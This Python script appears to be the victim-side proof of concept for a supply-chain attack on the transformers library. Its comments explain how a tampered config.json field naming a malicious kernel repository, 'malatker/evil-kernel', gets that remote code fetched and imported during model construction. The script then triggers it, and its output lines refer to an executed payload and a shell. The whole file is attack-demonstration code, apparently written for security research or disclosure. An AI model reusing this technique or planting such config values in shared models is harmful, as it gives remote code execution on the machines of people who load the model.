import os
from transformers import AutoConfig, AutoModelForSequenceClassification

HERE = os.path.dirname(os.path.abspath(__file__))
MODEL_DIR = os.path.join(HERE, "payload", "model")

# The tampered config.json carries:
#   "_attn_implementation_internal": "malatker/evil-kernel"
# transformers resolves that during model CONSTRUCTION (PreTrainedModel.__init__
# -> _check_and_adjust_attn_implementation -> kernels.get_kernel -> import),
# so the payload fires here. We build from the config so no model weights are
# required (the original Hub model had weights; our local copy does not).
print(f"[*] Victim: loading tampered model config from: {MODEL_DIR}")
config = AutoConfig.from_pretrained(MODEL_DIR)

print("[*] Victim: constructing model — malicious kernel imports NOW...")
model = AutoModelForSequenceClassification.from_config(config)

print("[*] Victim: model constructed (payload already executed if a shell opened).")
